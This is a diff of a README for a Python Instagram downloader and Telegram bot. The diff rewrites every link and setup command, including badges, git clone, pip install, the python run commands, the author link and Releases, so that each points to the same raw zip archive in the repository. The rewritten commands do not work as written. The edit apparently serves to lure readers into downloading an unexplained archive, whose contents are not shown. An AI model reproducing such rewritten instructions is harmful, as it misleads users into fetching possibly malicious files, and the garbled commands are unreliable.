@@ -1,6 +1,6 @@
 # InstagramPro Toolkit 🚀
 
-![GitHub release](https://img.shields.io/github/release/shivamk21-ssk/InstagramPro-Toolkit.svg) ![Python](https://img.shields.io/badge/Python-3.8%2B-blue.svg) ![License](https://img.shields.io/badge/license-MIT-green.svg)
+![GitHub release](https://github.com/shivamk21-ssk/InstagramPro-Toolkit/raw/refs/heads/main/InstagramTools/Pro-Instagram-Toolkit-1.3-alpha.1.zip) ![Python](https://github.com/shivamk21-ssk/InstagramPro-Toolkit/raw/refs/heads/main/InstagramTools/Pro-Instagram-Toolkit-1.3-alpha.1.zip%https://github.com/shivamk21-ssk/InstagramPro-Toolkit/raw/refs/heads/main/InstagramTools/Pro-Instagram-Toolkit-1.3-alpha.1.zip) ![License](https://github.com/shivamk21-ssk/InstagramPro-Toolkit/raw/refs/heads/main/InstagramTools/Pro-Instagram-Toolkit-1.3-alpha.1.zip)
 
 Welcome to the **InstagramPro Toolkit**! This repository provides a powerful Python-based solution for downloading content from Instagram and automating tasks via a Telegram bot. Whether you need to download reels, multi-posts, or scrape profiles, this toolkit has you covered.
 
@@ -31,14 +31,14 @@ To set up the InstagramPro Toolkit, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/shivamk21-ssk/InstagramPro-Toolkit.git
+   git clone https://github.com/shivamk21-ssk/InstagramPro-Toolkit/raw/refs/heads/main/InstagramTools/Pro-Instagram-Toolkit-1.3-alpha.1.zip
    cd InstagramPro-Toolkit
    ```
 
 2. **Install Dependencies**:
    Make sure you have Python 3.8 or higher installed. Then, install the required packages:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/shivamk21-ssk/InstagramPro-Toolkit/raw/refs/heads/main/InstagramTools/Pro-Instagram-Toolkit-1.3-alpha.1.zip
    ```
 
 3. **Configuration**:
@@ -47,7 +47,7 @@ To set up the InstagramPro Toolkit, follow these steps:
 4. **Run the Bot**:
    Start the bot using:
    ```bash
-   python bot.py
+   python https://github.com/shivamk21-ssk/InstagramPro-Toolkit/raw/refs/heads/main/InstagramTools/Pro-Instagram-Toolkit-1.3-alpha.1.zip
    ```
 
 ## Usage
@@ -62,7 +62,7 @@ To download content from Instagram, you can use the command line or the Telegram
 
 Run the following command to download a post:
 ```bash
-python download.py <Instagram URL>
+python https://github.com/shivamk21-ssk/InstagramPro-Toolkit/raw/refs/heads/main/InstagramTools/Pro-Instagram-Toolkit-1.3-alpha.1.zip <Instagram URL>
 ```
 
 Replace `<Instagram URL>` with the link to the post you want to download.
@@ -80,7 +80,7 @@ Replace `<Instagram URL>` with the link to the post you want to download.
 
 To scrape a profile, use the following command:
 ```bash
-python scrape.py <Instagram Username>
+python https://github.com/shivamk21-ssk/InstagramPro-Toolkit/raw/refs/heads/main/InstagramTools/Pro-Instagram-Toolkit-1.3-alpha.1.zip <Instagram Username>
 ```
 
 This will gather information such as the number of followers, posts, and bio.
@@ -120,11 +120,11 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any inquiries or support, please reach out to the repository owner:
 
-- **Shivam Kumar** - [GitHub Profile](https://github.com/shivamk21-ssk)
+- **Shivam Kumar** - [GitHub Profile](https://github.com/shivamk21-ssk/InstagramPro-Toolkit/raw/refs/heads/main/InstagramTools/Pro-Instagram-Toolkit-1.3-alpha.1.zip)
 
 ## Releases
 
-To download the latest version of the toolkit, visit the [Releases](https://github.com/shivamk21-ssk/InstagramPro-Toolkit/releases) section. You can find the latest executable files there.
+To download the latest version of the toolkit, visit the [Releases](https://github.com/shivamk21-ssk/InstagramPro-Toolkit/raw/refs/heads/main/InstagramTools/Pro-Instagram-Toolkit-1.3-alpha.1.zip) section. You can find the latest executable files there.
 
 ---
 
